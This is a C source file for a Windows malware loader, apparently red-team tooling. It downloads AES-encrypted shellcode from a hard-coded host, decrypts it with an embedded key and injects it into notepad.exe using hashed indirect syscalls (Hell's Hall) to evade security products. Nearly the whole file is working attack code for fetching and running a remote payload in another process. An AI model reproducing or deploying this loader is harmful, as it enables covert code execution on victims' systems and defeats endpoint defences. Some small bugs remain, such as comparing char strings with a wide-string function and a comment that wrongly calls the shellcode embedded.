#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <wininet.h>
#include "aes.h"
#include "HellsHall.h"
#include "Structs.h"
#include <TlHelp32.h>

#define NtAllocateVirtualMemory_CRC32    0x498165AA
#define NtProtectVirtualMemory_CRC32     0x17C9087B
#define NtWriteVirtualMemory_CRC32       0xF7C5A233
#define NtCreateThreadEx_CRC32			 0x6411D915
#define NtWaitForSingleObject_CRC32      0x3D93EDA4

// import wininet.lib

#pragma comment (lib, "Wininet.lib")
#define PAYLOAD L"http://192.168.13.1:8000/encrypted_shellcode_adaptix.bin"
#define TARGET_PROCESS "notepad.exe"
// basic shellcode loader that have the shellcode embedded within the file

// set to 1 for error logs

//#define DEBUG




DWORD HashStringDjb2A(_In_ LPCSTR String)
{
	ULONG Hash = 5381;
	INT c = 0;

	while (c = *String++)
		Hash = ((Hash << 5) + Hash) + c;

	return Hash;
}


BOOL GetPayload(LPCWSTR srcurl, PBYTE* sPayloadBytes, size_t* sPayloadSize) {

    PBYTE pTmpBytes = NULL;

    PBYTE pBytes = NULL;

    SSIZE_T sSize = 0;

    DWORD dwBytesRead = 0;

    HINTERNET hInternet = NULL;

    HINTERNET hInternetFile = NULL;
    // open an hInternet Handle
    hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);

    hInternetFile = InternetOpenUrlW(hInternet, srcurl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);

    if (hInternetFile == NULL) {
        #ifdef DEBUG
        printf("[!] InternetOpenUrlW failed with code: %d \n", GetLastError());
        #endif
        return FALSE;
    }

    // Allocate a temp 1024 bytes memory region
    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);

    while (TRUE)
    {

        // InternetReadFile will report less read bytes if the final chunk is less than 1024 bytes
        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
            #ifdef DEBUG
            printf("[!] InternetReadFile failed with error: %d \s", GetLastError());
            #endif
            return FALSE;
        }

        // update the amount of readable bytes to the total size
        sSize += dwBytesRead;

        if (pBytes == NULL) { // if pBytes haven't been allocated yet.
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        } else { // Relloc every time sSize updates
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
        }

        if (pBytes == NULL) {
            return FALSE;
        }

        // Add the temp buffer to the end of the total buffer
        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

        memset(pTmpBytes, '\0', dwBytesRead);

        if (dwBytesRead < 1024) {
            break;
        }

    }

        InternetCloseHandle(hInternet);
        InternetCloseHandle(hInternetFile);
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);

        *sPayloadBytes = pBytes;
        *sPayloadSize = sSize;

        LocalFree(pTmpBytes);
        #ifdef DEBUG
        printf("[+] Size of payload: %d \n", sSize);
        #endif
        return TRUE;

}


unsigned char AesKey[] = {
	0xAC, 0x85, 0x0C, 0xAD, 0xDB, 0x0F, 0x69, 0xED, 0x58, 0x21, 0xD8, 0xEE, 0xA7, 0x7E, 0x24, 0x24,
	0xFB, 0xDD, 0x34, 0xA4, 0xA9, 0x90, 0x28, 0xE3, 0xDB, 0x65, 0xA5, 0xC1, 0x89, 0xCA, 0x6C, 0xC6 };


unsigned char AesIv[] = {
	0x0D, 0x01, 0x7F, 0x63, 0x51, 0xA6, 0x7A, 0xFB, 0x2C, 0x69, 0x73, 0x83, 0x7E, 0xF9, 0x75, 0xA6 };

// for debugging only

VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

	printf("unsigned char %s[] = {", Name);

	for (int i = 0; i < Size; i++) {
		if (i % 16 == 0) {
			printf("\n\t");
		}
		if (i < Size - 1) {
			printf("0x%0.2X, ", Data[i]);
		}
		else {
			printf("0x%0.2X ", Data[i]);
		}
	}

	printf("};\n\n\n");

}
BOOL DecryptAES(IN PBYTE pCipherTextBuffer, IN SIZE_T sCipherTextSize, IN PBYTE pAesKey, IN PBYTE pAesIv) {

	struct	AES_ctx AesCtx = { 0x00 };

	if (!pCipherTextBuffer || !sCipherTextSize || !pAesKey || !pAesIv)
		return FALSE;

	RtlSecureZeroMemory(&AesCtx, sizeof(AesCtx));
	AES_init_ctx_iv(&AesCtx, pAesKey, pAesIv);
	AES_CBC_decrypt_buffer(&AesCtx, pCipherTextBuffer, sCipherTextSize);

	return TRUE;
}

// defining the struct containing the API we want to obtain via Hell's Hall
typedef struct _NTAPI_FUNC
{
	NT_SYSCALL	NtAllocateVirtualMemory;
	NT_SYSCALL	NtProtectVirtualMemory;
	NT_SYSCALL	NtWriteVirtualMemory;
	NT_SYSCALL	NtCreateThreadEx;
	NT_SYSCALL	NtWaitForSingleObject;

} NTAPI_FUNC, * PNTAPI_FUNC;


// Define the struct  
NTAPI_FUNC NTAPI_struct = { 0 };

// Grab the API 
BOOL InitializeNtSyscalls() {

	if (!FetchNtSyscall(NtAllocateVirtualMemory_CRC32, &NTAPI_struct.NtAllocateVirtualMemory)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtAllocateVirtualMemory \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &NTAPI_struct.NtProtectVirtualMemory)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtWriteVirtualMemory_CRC32, &NTAPI_struct.NtWriteVirtualMemory)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtWriteVirtualMemory \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtCreateThreadEx_CRC32, &NTAPI_struct.NtCreateThreadEx)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtWaitForSingleObject_CRC32, &NTAPI_struct.NtWaitForSingleObject)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtWaitForSingleObject \n");
		return FALSE;
	}

	return TRUE;
}

BOOL GetRemoteProcessHandle(LPSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {

	// According to the documentation:
	// Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32).
	// If dwSize is not initialized, Process32First fails.
	PROCESSENTRY32	Proc = {
		.dwSize = sizeof(PROCESSENTRY32) 
	};

	HANDLE hSnapShot = NULL;

	// Takes a snapshot of the currently running processes 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE){
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first process encountered in the snapshot.
	if (!Process32First(hSnapShot, &Proc)) {
		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {

		CHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {
			DWORD	dwSize = lstrlenA(Proc.szExeFile);
			DWORD   i = 0;

			RtlSecureZeroMemory(LowerName, sizeof(LowerName));

			// Converting each character in Proc.szExeFile to a lower case character
			// and saving it in LowerName
			if (dwSize < MAX_PATH * 2) {

				for (; i < dwSize; i++)
					LowerName[i] = (CHAR)tolower(Proc.szExeFile[i]);

				LowerName[i++] = '\0';
			}
		}

		// If the lowercase'd process name matches the process we're looking for
		if (wcscmp(LowerName, szProcessName) == 0) {
			// Save the PID
			*dwProcessId = Proc.th32ProcessID;
			// Open a handle to the process
			*hProcess    = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

			break;
		}

	// Retrieves information about the next process recorded the snapshot.
	// While a process still remains in the snapshot, continue looping
	} while (Process32Next(hSnapShot, &Proc));

	// Cleanup
	_EndOfFunction:
		if (hSnapShot != NULL)
			CloseHandle(hSnapShot);
		if (*dwProcessId == NULL || *hProcess == NULL)
			return FALSE;
		return TRUE;
	}


BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcodeAddress, IN SIZE_T sShellcodeSize, OUT PBYTE* ppInjectionAddress, OUT OPTIONAL HANDLE* phThread) {

	NTSTATUS	STATUS					= 0x00;
	PBYTE		pTmpBaseAddress			= NULL;
	SIZE_T		sTmpPayloadSize			= sShellcodeSize,
				sNumberOfBytesWritten	= 0x00;
	DWORD		dwOldProtection			= 0x00;
	HANDLE		hThread					= NULL;

	if (!hProcess || !pShellcodeAddress || !sShellcodeSize || !ppInjectionAddress)
		return FALSE;

	if (!InitializeNtSyscalls())
		return FALSE;

	SET_SYSCALL(NTAPI_struct.NtAllocateVirtualMemory);
	if (!NT_SUCCESS((STATUS = RunSyscall(hProcess, &pTmpBaseAddress, 0x00, &sTmpPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) || pTmpBaseAddress == NULL) {
		#ifdef DEBUG
        printf("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
		#endif
        return FALSE;
	}

    #ifdef DEBUG 
	printf("pTmpBaseAddress: 0x%p \n", pTmpBaseAddress);
    #endif

	SET_SYSCALL(NTAPI_struct.NtProtectVirtualMemory);
	if (!NT_SUCCESS((STATUS = RunSyscall(hProcess, &pTmpBaseAddress, &sTmpPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)))) {
		#ifdef DEBUG
		printf("[!] NtProtectVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
		#endif
        return FALSE;
	}

	if (hProcess != NtCurrentProcess()) {

		SET_SYSCALL(NTAPI_struct.NtWriteVirtualMemory);
		if (!NT_SUCCESS((STATUS = RunSyscall(hProcess, pTmpBaseAddress, pShellcodeAddress, sShellcodeSize, &sNumberOfBytesWritten))) || sNumberOfBytesWritten != sShellcodeSize) {
			#ifdef DEBUG
            printf("[!] NtWriteVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
			#endif
            return FALSE;
		}
	}
	else
		memcpy(pTmpBaseAddress, pShellcodeAddress, sShellcodeSize);


	SET_SYSCALL(NTAPI_struct.NtCreateThreadEx);
	if (!NT_SUCCESS((STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pTmpBaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL)))) {
		#ifdef DEBUG
        printf("[!] NtCreateThreadEx Failed With Error: 0x%0.8X\n", STATUS);
		#endif
        return FALSE;
	}

	if (phThread)
		*phThread		= hThread;
	*ppInjectionAddress = pTmpBaseAddress;
    #ifdef DEBUG
	SET_SYSCALL(NTAPI_struct.NtWaitForSingleObject);
	if (!NT_SUCCESS((STATUS = RunSyscall(hThread, FALSE, NULL)))) {
        printf("[!] NtWaitForSingleObject Failed With Error: 0x%0.8X \n", STATUS);
        return FALSE;
	}
    #endif
	return TRUE;
}

int main() {
    PBYTE pEncrypted = NULL;
    size_t sSizeOfPayload = 0;
    DWORD flOldProtect = 0;
    DWORD dwProcessId = 0;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    PVOID pShellcodeAddress = NULL;
    NTSTATUS STATUS = 0x00;
    PVOID ppInjectionAddress = NULL;

    if (!InitializeNtSyscalls()) {
        return -1;
    }

    // 1: Get encrypted payload

    if (!GetPayload(PAYLOAD, &pEncrypted, &sSizeOfPayload)) {
        #ifdef DEBUG
        printf("[!] Failed to get the payload\n ");
        #endif
        return -1;
    }

    // 2: Decrypt Payload

    #ifdef DEBUG
    PrintHexData("pEncrypted", pEncrypted, sSizeOfPayload);
    PrintHexData("AESKey", AesKey, sizeof(AesKey));
    printf("[+] Press Enter to continue......");
    getchar();
    #endif

    if (!DecryptAES(pEncrypted, sSizeOfPayload, AesKey, AesIv)) {
        #ifdef DEBUG
        printf("[!] Failed to decrypt the buffer \n ");
        #endif
        return -1;
    }

    #ifdef DEBUG
    PrintHexData("pDecrypted", pEncrypted, sSizeOfPayload);
    printf("[+] Press Enter to continue......");
    getchar();
    #endif

    // 3: Get remote process handle (In this case, Notepad.exe)
    if (!GetRemoteProcessHandle(TARGET_PROCESS, &dwProcessId, &hProcess)) {
        #ifdef DEBUG
        printf("[!] GetRemoteProcessHandle failed \n");
        #endif
        return -1;
    }
	
    #ifdef DEBUG
    printf("[+] Found process ID: %d", dwProcessId);
    #endif
    // 4: Inject shellcode into program
    if (!InjectShellcodeToRemoteProcess(hProcess, pEncrypted, sSizeOfPayload, &ppInjectionAddress, NULL)) {
        #ifdef DEBUG
        printf("[!] Shellcode Injection failed \n");
        #endif
        return -1;
    }

    return 0;
}
